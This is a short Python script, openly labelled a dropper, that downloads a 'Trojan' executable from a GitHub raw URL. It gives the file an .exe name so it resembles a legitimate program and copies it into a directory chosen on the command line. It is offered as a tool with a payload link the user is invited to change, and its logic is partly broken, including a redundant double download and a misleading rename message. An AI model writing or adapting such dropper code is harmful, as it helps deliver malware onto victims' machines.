import os
import sys
import requests
import shutil
import argparse
import random

def download(url, filename):
    """Downloads a file from a given URL."""
    try:
        with open(filename, 'wb') as f:
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                for chunk in response:
                    f.write(chunk)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Download error: {e}")
        return False

def dropper(url, target, filename):
    """Drops the Trojan by downloading it."""
    try:
        # Ensure the executable is in a temporary location
        if not os.path.exists("temp_dropper"):
            os.makedirs("temp_dropper")

        filepath = f"temp_dropper/{filename}"
        
        print(f"[+] Downloading Trojan from {url}...")
        download(url, filepath)

        # Rename the file if necessary to make it more similar to a legitimate executable
        if filename.count('.exe') == 0:
            filepath += ".exe"
            print(f"[+] Renaming dropped file to {filename}")

        # Copy the Trojan to the target directory using shutil
        shutil.copy2(filepath, target)
        
        print(f"[+] Trojan Dropped at: {target}")
    except Exception as e:
        print(f"Dropping error: {e}")

def main():
    """Main function."""
    parser = argparse.ArgumentParser(description="Dropper")
    parser.add_argument("-t", help="Target directory (ex: C:\\temp)", required=True)
    args = parser.parse_args()

    # Example Usage
    
    print("[+] Dropping Trojan...")
    
    # Download Link - Feel free to change this!
    url = "https://github.com/K1rus/sample-trojan/raw/main/dropper.exe"
    
    if not download(url, "dropper.exe"):
        print("[+] Error downloading Trojan")
        sys.exit(1)

    # Define the target and filename
    target = args.t
    filename = "trojan.exe"
    
    # Drop the Trojan
    dropper(url, target, filename)

if __name__ == "__main__":
    main()
